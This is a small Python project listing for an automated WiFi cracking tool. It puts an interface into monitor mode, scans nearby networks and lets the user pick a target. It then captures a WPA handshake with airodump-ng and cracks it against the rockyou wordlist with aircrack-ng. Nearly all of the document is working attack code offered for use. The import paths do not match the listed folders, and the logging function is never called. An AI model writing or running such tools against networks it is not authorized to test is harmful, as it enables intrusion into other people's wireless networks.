wifi/
├── main/
│   ├── interface.py
│   ├── scanner.py
│   ├── handshake.py
│   ├── cracker.py
│   └── logger.py
├── wordlists/
│   └── rockyou.txt
├── auto_crack.py
├── wifi (executable script)
├── README.md
├── LICENSE
└── requirements.txt

# interface
import subprocess

def setup_interface():
    interface = "wlan0"
    print(f"[+] Setting {interface} to monitor mode...")
    subprocess.run(["airmon-ng", "start", interface])
    return interface + "mon"

# scanning
import subprocess
import time

def scan_networks(interface="wlan0mon", scan_time=10):
    print(f"[+] Scanning for networks on {interface}...")
    dumpfile = "scan_results"
    cmd = f"airodump-ng {interface} --write {dumpfile} --output-format csv"
    proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(scan_time)
    proc.terminate()
    time.sleep(2)

    networks = []
    with open(f"{dumpfile}-01.csv", "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()

    for line in lines:
        if "Station MAC" in line:
            break
        fields = line.strip().split(',')
        if len(fields) > 13 and fields[0].strip() != 'BSSID':
            bssid = fields[0].strip()
            channel = fields[3].strip()
            signal = fields[8].strip()
            ssid = fields[13].strip()
            if ssid:
                networks.append((ssid, bssid, channel, signal))
    return networks

def select_network(networks):
    print("\nAvailable Networks:")
    for i, net in enumerate(networks):
        print(f"[{i}] SSID: {net[0]} | BSSID: {net[1]} | Channel: {net[2]} | Signal: {net[3]}")
    choice = int(input("Select target network by number: "))
    return networks[choice]

# handshake capturing
import subprocess
import time

def capture_handshake(interface, target):
    ssid, bssid, channel, _ = target
    print(f"[+] Starting handshake capture on {ssid} (Channel {channel})")
    subprocess.run(["iwconfig", interface, "channel", channel])
    subprocess.Popen(["airodump-ng", "--bssid", bssid, "-c", channel, "-w", "handshake", interface])
    print("[+] Waiting for handshake ...")
    time.sleep(20)
    print("[+] Handshake capture attempt complete.")

# cracking
import subprocess

def crack_password(target):
    bssid = target[1]
    print("[+] Cracking password using aircrack-ng...")
    subprocess.run(["aircrack-ng", "-w", "wordlists/rockyou.txt", "-b", bssid, "handshake-01.cap"])

# Result

def log_result(ssid, password):
    with open("results.txt", "a") as f:
        f.write(f"SSID: {ssid} | Password: {password}\n")

# auto cracking
from core.interface import setup_interface
from core.scanner import scan_networks, select_network
from core.handshake import capture_handshake
from core.cracker import crack_password

def main():
    interface = setup_interface()
    networks = scan_networks(interface)
    target = select_network(networks)
    print(f"[+] Target selected: {target[0]} ({target[1]})")
    capture_handshake(interface, target)
    crack_password(target)

if __name__ == "__main__":
    main()
